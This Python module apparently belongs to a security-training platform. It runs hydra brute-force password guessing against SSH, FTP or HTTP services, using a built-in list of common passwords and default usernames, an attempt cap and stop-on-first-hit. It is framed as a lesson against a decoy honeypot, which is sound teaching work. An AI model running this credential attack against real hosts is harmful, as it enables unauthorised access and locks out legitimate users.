"""Attack modules: scenario — hydra credential attack.

Hydra against a service, with a small built-in wordlist. This is the loud,
fast, unreproducible version of the attack — deliberately so, because the
contrast with `trapdoor_ssh_bruteforce` is the lesson: same target, same
credentials, completely different transcript.

WHERE THE WORDLIST COMES FROM
    Generated, not shipped. A fixed file would be one more thing to keep in
    sync, and the point is a short list of the passwords people actually use,
    not a borrowed rockyou. Thirty-two lines, ordered the way a real attacker
    orders them — the likely candidates first.

SAFETY
    Hydra locks accounts for real. There is a hard cap on attempts (found
    below), and the run stops on the first hit. On a decoy that is free; on a
    real box a student has just locked out a service, which is a conversation
    worth having before they do it.

`complete`: hydra reporting "0 valid passwords" is a fact, not a failure, and
finding one is a fact, not a pass. The claim this could assert — "the decoy
logged the attempt" — needs Trapdoor's event log, which this container does
not have.
"""

from __future__ import annotations

import os
import re
import subprocess
import tempfile

from ..jobs import Blocked
from ._common import require_tool

NAME = "hydra_brute"
LABEL = "Hydra credential attack"
DESC = "Fast credential attack against ssh, ftp, or http basic auth, with a short built-in list."
CATEGORY = "scenario"
NEEDS_PORT = True

# Common-by-popularity, not alphabetical. A real attacker tries the likely
# ones first, and the first hits are what a defender sees in the log.
PASSWORDS = [
    "password", "123456", "12345678", "qwerty", "admin", "letmein", "welcome",
    "monkey", "abc123", "1234567890", "toor", "root", "admin123", "passw0rd",
    "password1", "changeme", "test", "guest", "hello", "secret", "master",
    "dragon", "shadow", "sunshine", "princess", "football", "baseball",
    "iloveyou", "trustno1", "superman", "batman", "raspberry",
]

# Five usernames against 32 passwords is 160 attempts worst case. Cap lower so
# a run cannot lock out a real service or outlast a class period.
MAX_ATTEMPTS = 60
TIMEOUT = 240

PROTOCOLS = ("ssh", "ftp", "http-get")


def run(target: str, port: int | None, emit, protocol: str = "ssh") -> dict:
    if not port:
        raise Blocked("this attack needs a port")

    require_tool("hydra")

    if protocol not in PROTOCOLS:
        raise Blocked(f"protocol must be one of {', '.join(PROTOCOLS)}")

    # Same names Trapdoor's own scenario tries first: root, admin, ubuntu.
    users = ["root", "admin", "ubuntu", "user", "test"]

    emit(f"[*] {protocol} against {target}:{port}")
    emit(f"[*] {len(users)} usernames x up to {len(PASSWORDS)} passwords")
    emit(f"[*] hard cap {MAX_ATTEMPTS} attempts, stops on first hit")
    emit("")
    emit("This is the loud version. Compare it to the scripted scenario: same")
    emit("credentials, completely different transcript in the decoy's log.")
    emit("")

    with tempfile.TemporaryDirectory() as tmp:
        pfile = os.path.join(tmp, "pass.txt")
        ufile = os.path.join(tmp, "users.txt")
        with open(pfile, "w") as fh:
            fh.write("\n".join(PASSWORDS) + "\n")
        with open(ufile, "w") as fh:
            fh.write("\n".join(users) + "\n")

        try:
            proc = subprocess.run(
                [
                    "hydra",
                    "-L", ufile,
                    "-P", pfile,
                    "-t", "4",
                    "-f",              # stop on first found
                    "-I",              # ignore restore file
                    "-V",              # show every attempt, that is the lesson
                    f"{target}",
                    "-s", str(port),
                    protocol,
                ],
                capture_output=True,
                text=True,
                timeout=TIMEOUT,
            )
        except subprocess.TimeoutExpired as exc:
            partial = exc.stdout or ""
            if isinstance(partial, bytes):
                partial = partial.decode("utf-8", "replace")
            tail = partial.splitlines()[-25:]
            for line in tail:
                emit(f"    {line}")
            raise Blocked(
                f"hydra hit the {TIMEOUT}s wall. Partial output above is what "
                f"it managed; the target may be rate-limiting or slow."
            ) from exc

    out = (proc.stdout or "") + (proc.stderr or "")
    if not out.strip():
        raise Blocked(f"hydra produced no output (exit {proc.returncode})")

    # Hydra reports attempts as "[22][ssh] host: X login: Y password: Z" and a
    # success on the line "1 valid password found".
    found: list[str] = []
    attempts = 0
    for line in out.splitlines():
        s = line.strip()
        if not s:
            continue
        if re.search(r"\[(ssh|ftp|http-get)\] host:", s):
            found.append(s)
            emit(f"    [+] {s}")
        elif s.startswith("[ATTEMPT]"):
            attempts += 1
            # Only show the last few attempts; 160 lines of noise is not
            # readable and the head of the list is the same every run.
            if attempts <= 12:
                emit(f"    {s}")
        elif "valid password" in s.lower():
            emit(f"    {s}")

    emit("")
    if found:
        emit(f"[+] {len(found)} credential(s) worked after ~{attempts} attempts.")
        emit("    On a decoy this is the point: the break-in was loud and the")
        emit("    log will show every failed attempt before the hit.")
        return {"status": "complete", "summary": f"{len(found)} credential(s) found"}

    if attempts == 0:
        raise Blocked(
            "hydra reported neither attempts nor a result — nothing was "
            "tested, so nothing was proven"
        )

    emit(f"[-] no credential worked in ~{attempts} attempts.")
    emit("    Check that the port really speaks this protocol; hydra will")
    emit("    happily report zero against a service it could not talk to.")
    return {"status": "complete", "summary": f"no credential in ~{attempts} attempts"}
